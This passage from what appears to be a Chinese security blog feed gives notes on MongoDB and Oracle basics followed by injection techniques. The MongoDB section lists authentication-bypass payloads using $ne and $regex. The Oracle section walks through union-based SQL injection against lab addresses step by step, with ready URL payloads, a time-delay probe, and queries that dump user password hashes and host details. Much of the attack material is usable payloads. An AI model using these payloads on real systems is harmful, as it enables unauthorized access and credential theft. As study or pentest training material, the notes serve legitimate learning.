        <content type="html"><![CDATA[<h2 id="mongodb-基础"><a href="#mongodb-基础" class="headerlink" title="mongodb 基础"></a>mongodb 基础</h2><p><strong>mongodb 概念</strong></p><table><thead><tr><th>SQL语句</th><th>Mongodb语句</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表/集合</td></tr><tr><td>row</td><td>document</td><td>数据记录/文档</td></tr><tr><td>column</td><td>field</td><td>数据字段/域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>primary key</td><td>primary key</td><td>主键</td></tr></tbody></table><p><strong>MongoDB的基本操作</strong></p><ul><li><p><strong>MongoDB的启动</strong><br>• 开启服务：sudo mongod<br>• 登陆mongodb数据库：mongo –host 127.0.0.1</p></li><li><p><strong>数据库的操作</strong><br>• 查看所有的数据库：show dbs<br>• 切换数据库： use 数据库名<br>• 查看集合：show collections<br>• 数据库的创建：use 数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。<br>• 删除数据库：进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库</p></li><li><p><strong>集合的操作</strong><br>• 查看集合：show collections<br>• 创建集合：db.createCollection(“xxx”)<br>• 删除集合：db.xxx.drop()</p></li><li><p><strong>增</strong></p></li></ul><p>增加数据：db.xx.insert({key:value}) </p><p>举例：db.ichunqiu.insert({_id:1,name:”web”,age:10})</p><ul><li><p><strong>删</strong><br>① 全部删除：db.xx.remove({ })<br>② 根据条件删除，默认是删除所有符合条件的数据：db.xx.remove({age:10})<br>③ 只删除符合条件的第一个：db.xx.remove({gender:true},{justOne:true})</p></li><li><p><strong>改</strong><br>更改操作：db.xx.update({查找的条件}，{修改的内容})<br>① 修改内容：默认其他原有字段删除了，替换掉原有数据<br>db.xx.update({age:10},{name:”NoSQL ”})<br>② 保持原有的字段，加一个修饰$set：默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加<br>db.stu.update({age:10},{$set:{like:“study”}}) 说明：把like:”study”添加到数据里面，并不是替换</p></li><li><p><strong>查</strong></p></li></ul><p>基本查询：db.xx.find({查询条件})<br>① 查询所有的数据：db.xx.find() 或 db.xx.find({ })<br>② 默认查出所有符合条件的数据：db.xx.find({age:10})<br>③ 查找符合条件的第一个：db.xx.findOne({age:10})<br>④ 格式化输出——pretty()函数：db.xx.find({age:10}).pretty()</p><ul><li><strong>条件查询</strong></li></ul><table><thead><tr><th>缩写</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>$lt</td><td>&lt;</td><td></td></tr><tr><td>$lte</td><td>&lt;=</td><td></td></tr><tr><td>$gt</td><td>&gt;</td><td></td></tr><tr><td>$gte</td><td>&gt;=</td><td></td></tr><tr><td>$ne</td><td>!=</td><td></td></tr><tr><td>$in</td><td>in</td><td></td></tr><tr><td>$nin</td><td>not in</td><td></td></tr><tr><td>$all</td><td>all</td><td></td></tr><tr><td>$or</td><td>or</td><td></td></tr><tr><td>$not</td><td>not</td><td></td></tr><tr><td>$regex</td><td>正则</td><td></td></tr></tbody></table><p><strong>举例：</strong></p><p>db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的<br>db.xx.find({age:{$ne:18}}) 查询年龄不等于18的<br>逻辑运算：$and，$or<br>① $and：默认的的查询条件就是且的关系<br><strong>举例：</strong></p><p>db.xx.find({age:28,gender:true})<br>db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女<br>② $or：或的关系<br>举例：db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男</p><h2 id="mongodb-注入"><a href="#mongodb-注入" class="headerlink" title="mongodb 注入"></a>mongodb 注入</h2><p><strong>NOsql 注入种类:</strong></p><ol><li>重言式/永真式</li><li>JavaScript注入（拼接,难度较大）</li><li>联合查询注入（被淘汰）</li><li>mongo shell拼接注入（难度中等，危害大</li></ol><p><strong>永真注入</strong></p><p>Ø 什么是重言式注入？ • 重言式又称为永真式。此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。PHP的特性，是支持在GET和POST数据中传输数组。这个特性和MongoDB结合在一起，就会出现安全问题</p><p>正常的请求：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>login.php?username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><p>MongoDB的查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection<span class="operator">-</span><span class="operator">&gt;</span>find(<span class="keyword">array</span>(&quot;username&quot; <span class="operator">=</span><span class="operator">&gt;</span> $_GET[<span class="string">&#x27; username &#x27;</span>], &quot;passwd&quot; <span class="operator">=</span><span class="operator">&gt;</span>$_GET[<span class="string">&#x27;passwd&#x27;</span>]));</span><br></pre></td></tr></table></figure><p> 构造特殊的请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login.php?username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p>正则表达匹配:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>login.php?username[$regex]<span class="operator">=</span>.<span class="operator">*</span>?<span class="operator">&amp;</span>password[$regex]<span class="operator">=</span>.<span class="operator">*</span>? .<span class="operator">*</span>?为匹配所有字符串</span><br></pre></td></tr></table></figure><p><strong>原理:</strong></p><p>就PHP本身的性质而言，由于其松散的数组特性，导致如果我们输入value=1那么，也就是输入了一个value的值为1 的数据。如果输入value[$ne]=2也就意味着value=array($ne=&gt;2),在MongoDB的角度来，很有可能从原来的一个单个目标 的查询变成了条件查询</p><p> 从 <strong>xxx.find({‘key’: ‘A’})  ======&gt;&gt;&gt; xxx.find({‘key’:{$ne:’A’}})</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/3/"/>
      <url>/posts/3/</url>
      
        <content type="html"><![CDATA[<h3 id="Oracle的基础操作"><a href="#Oracle的基础操作" class="headerlink" title="Oracle的基础操作"></a>Oracle的基础操作</h3><p><strong>基础语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ø 创建表：</span><br><span class="line">• 语句： <span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名称 类型 约束) • 举例： <span class="keyword">create</span> <span class="keyword">table</span> ichunqiu（name <span class="type">char</span>(<span class="number">10</span>) <span class="keyword">primary</span> key,age tinyint）</span><br><span class="line">Ø 增加列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span>(字段名称，数据类型) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">add</span>(class_name varchar2(<span class="number">200</span>))</span><br><span class="line">Ø 删除表中一列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">set</span> unused <span class="keyword">column</span> 列名</span><br><span class="line">• 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">set</span> unused <span class="keyword">column</span> name</span><br><span class="line">Ø 修改表字段：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify( 字段名称 新的字段类型 ) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu modify(name <span class="type">varchar</span>(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><p><strong>权限分类</strong></p><p>• DBA：拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构<br>• RESOURCE：拥有Resource权限的用户只可以创建实体，不可以创建数据库结构<br>• CONNECT：拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构<br>• 对于普通用户：授予connect, resource权限<br>• 对于DBA管理用户：授予connect，resource, dba权限<br>• 所有用户都是public组</p><p><strong>权限控制</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> userA; <span class="comment">--赋权给用户：userA</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> public; <span class="comment">--赋权给所有用户</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>, update <span class="keyword">on</span> product <span class="keyword">to</span> userA <span class="keyword">with</span> <span class="keyword">grant</span> option;<span class="comment">-- userA得到权限，并可以传递</span></span><br><span class="line">• <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> userA; <span class="comment">--收回给予的权限从用户</span></span><br><span class="line">• userA <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> public; <span class="comment">--收回给予的权限从所有用户</span></span><br></pre></td></tr></table></figure><h3 id="Oracle的系统表"><a href="#Oracle的系统表" class="headerlink" title="Oracle的系统表"></a>Oracle的系统表</h3><ul><li><strong>dba_tables</strong> : 系统里所有的表的信息，需要DBA权限才能查询</li><li><strong>all_tables : 当前用户有权限的表的信息</strong></li><li><strong>user_tables</strong>: 当前用户名下的表的信息</li><li><strong>all_tab_columns: 当前用户名下的所有字段名</strong></li><li><strong>DBA_ALL_TABLES</strong>：DBA 用户所拥有的或有访问权限的对象和表</li><li><strong>ALL_ALL_TABLES</strong>：某一用户拥有的或有访问权限的对象和表</li><li><strong>USER_ALL_TABLES</strong>：某一用户所拥有的对象和表</li></ul><p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全</p><p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p><p><strong>concat 只能拼字符串, ||拼列 查询</strong></p><p><strong>强类型转换的时候 数字型  可以使用ascii(substring(banner,1,2)) 转为数字型查询</strong></p><p><strong>跨库查询和mysql一样: SELECT * FROM TEST.ADMIN</strong></p><h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><p><strong>1.获取数据库版本：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">具体注入的语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version WHERE banner LIKE &#x27;</span>Oracle<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure><p><strong>2.获取操作系统版本：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version where banner like &#x27;</span>TNS<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure><p><strong>3.获取当前用户权限的所有数据库：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner,table_name <span class="keyword">FROM</span> all_tables;</span><br></pre></td></tr></table></figure><p><strong>4.获取当前数据库：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> global_name <span class="keyword">FROM</span> global_name;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database;</span><br><span class="line"><span class="keyword">SELECT</span> instance_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> SYS.DATABASE_NAME <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure><p><strong>5.获取用户相关信息：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual;获取当前数据库用户</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;列出所有用户</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; — priv;列出所有用户</span><br><span class="line"></span><br><span class="line">列出密码哈希:</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$ — priv; <span class="operator">&lt;=</span> <span class="number">10</span>g(astatus能够在acct被锁定的状态下给你反馈)</span><br><span class="line"><span class="keyword">SELECT</span> name,spare4 <span class="keyword">FROM</span> sys.user$ — priv; <span class="number">11</span>g</span><br><span class="line"></span><br><span class="line">获取数据库所有用户:</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> session_privs; 获取当前用户权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> dba_sys_privs <span class="comment">-- priv;  获取所有用户权限</span></span><br><span class="line"></span><br><span class="line">获取用户角色</span><br><span class="line"><span class="keyword">SELECT</span> GRANTEE, GRANTED_ROLE <span class="keyword">FROM</span> DBA_ROLE_PRIVS;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs;</span><br><span class="line"></span><br><span class="line">获取所有数据库用户密码</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &lt;= 10g;</span></span><br><span class="line"><span class="keyword">SELECT</span> name, spare4 <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &gt;= 11g; </span></span><br><span class="line"></span><br><span class="line">列出DBA账户: #<span class="keyword">DISTINCT</span> 去重复函数</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs <span class="keyword">WHERE</span> ADMIN_OPTION <span class="operator">=</span> ‘YES’; — priv;</span><br><span class="line"></span><br><span class="line">获取主机名和IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="keyword">SELECT</span> host_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_address <span class="keyword">FROM</span> dual;  查IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name(‘<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’) <span class="keyword">FROM</span> dual;  查主机名称</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> V$DATAFILE;  获取DB文件路径</span><br></pre></td></tr></table></figure><p><strong>6.获取字段名和表名:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables; 获取表名</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns; 获取字段名</span><br></pre></td></tr></table></figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>1.判断是否存在注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://172.16.12.2:81/orcl.php? id=1 and 1=dbms_pipe.receive_message(&#x27;</span>RDS<span class="string">&#x27;, 5)--  延时</span></span><br></pre></td></tr></table></figure><p><strong>注释符</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle 单行 <span class="comment">-- 多行/**/</span></span><br><span class="line">Mssql 单行 <span class="comment">--空格多行/**/</span></span><br><span class="line">Mysql 单行 <span class="comment">--+/空格 #多行/**/</span></span><br></pre></td></tr></table></figure><p><strong>2.判断字段数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>3.联合查询找回显位</strong><br>Oracle 数据库查询需要 from dual (虚表/伪表) 专为查询语句设置的表 union select * from dual–</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--   #null代替所有类型</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>4.查询数据库版本</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>5.查询数据库连接用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">-- #test</span></span><br></pre></td></tr></table></figure><p><strong>6.当前实例名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> instance_name <span class="keyword">from</span> v$instance),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>7.遍历数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;SYS&#x27;</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>8.遍历表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> ROWNUM <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;tb_user&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>) </span><br></pre></td></tr></table></figure><p><strong>9.遍历表字段名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span> <span class="keyword">AND</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>10.查询字段数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> NAME<span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> &quot;name&quot;<span class="operator">||</span>&quot;age&quot; <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span 